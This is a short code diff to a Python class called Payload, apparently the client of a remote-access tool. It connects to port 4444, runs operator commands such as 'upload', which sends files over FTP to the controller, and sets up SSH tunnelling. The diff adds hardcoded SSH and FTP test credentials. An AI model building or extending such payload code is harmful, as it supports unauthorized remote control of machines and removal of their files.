@@ -90,6 +90,8 @@ class Payload:
 
     host = '127.0.0.1'
     port = 4444
+    user_SSH = "user"
+    password_SSH = "passtest"
 
     SEPARATOR = "<sep>"
     BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
@@ -234,6 +236,7 @@ class Payload:
                     if splited_command[0].lower() == "upload":
                         path_fichier = splited_command[1]
                         ftp = FTP('')
+                        ftp.set_pasv(True)
                         ftp.connect(self.host, (self.port+2)) 
                         ftp.login(user='user', passwd = '12345')
                         fichier = path_fichier
@@ -518,7 +521,7 @@ class Payload:
                 action="store",
                 type="string",
                 dest="user",
-                default="theoc",
+                default=self.user_SSH,
                 help="username for SSH authentication (default: %s)"
                 % "theoc",
             )
@@ -573,7 +576,7 @@ class Payload:
         def main():
             options, server, remote = parse_options()
 
-            password = "mdp"
+            password = self.password_SSH
             #if options.readpass:
                 #password = getpass.getpass("Enter SSH password: ")
 
